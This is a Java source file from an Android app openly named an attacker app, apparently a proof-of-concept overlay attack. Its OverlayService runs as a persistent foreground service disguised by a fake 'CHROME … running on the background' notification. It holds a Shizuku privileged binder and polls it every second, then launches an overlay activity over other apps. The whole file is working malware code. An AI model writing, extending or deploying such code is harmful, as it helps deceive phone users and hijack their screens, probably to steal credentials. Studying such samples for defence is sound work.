package com.example.attackerappjava;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.util.ArrayList;
import java.util.Objects;

public class OverlayService extends Service {
    private static final String TAG = "[OverlayService]";
    private static final int NOTIFICATION_ID = 1001;
    private IUserService privilegedService;
    private Handler handler;
    private Runnable runnable;

    public OverlayService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: Starting overlay service...");

        createNotificationChannel();

        Notification noti = createNotification();

        startForeground(NOTIFICATION_ID, noti);
        handler = new Handler();
        runnable = new Runnable() {
            @Override
            public void run() {
                Log.d(TAG, "Overlay service running ......");
                //the triggering condition
                try {
                    boolean output = privilegedService.triggerOverlay();
                    if(output){
                        triggerOverlayActivity("Triggered OverlayActivity from OverlayService");
                        handler.removeCallbacks(runnable);
                    }
                    else{
                        handler.postDelayed(this,1000);
                    }
                } catch (RemoteException e) {
                    throw new RuntimeException(e);
                }
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand");
        if(intent!=null && intent.getExtras()!=null) {
            privilegedService = IUserService.Stub.asInterface(Objects.requireNonNull(intent.getExtras()).getBinder("shizuku_privileged_service_binder_key_in_bundle"));
        }
        else {
            Log.d(TAG,"Intents contents are null...");
        }
        handler.postDelayed(runnable, 1000);
        return START_STICKY;
        //THIS ENSURES THAT OUR SERVICE HAS TO BE EXPLICITLY STOPPED AND STARTED...
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed..");
        if (handler != null) {
            handler.removeCallbacks(runnable);
        }
        stopForeground(true);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel("1234","Foreground service channel", NotificationManager.IMPORTANCE_DEFAULT);
            serviceChannel.setDescription("Chrome is running on the background...");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if(manager!=null){
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private Notification createNotification(){
        return new NotificationCompat.Builder(this,"1234")
                .setContentTitle("CHROME")
                .setContentText("Chrome is running on the background...")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void triggerOverlayActivity(String msg){
        Log.d(TAG, "triggerOverlayActivity: " + msg);
        Intent intent = new Intent(this,OverlayActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Bundle extrasBundle = new Bundle();
        extrasBundle.putBinder("triggerOverlay", privilegedService.asBinder());
        intent.putExtras(extrasBundle);
        startActivity(intent);

        //After triggering the activity we will stop the service using this.
        stopSelf();
    }
}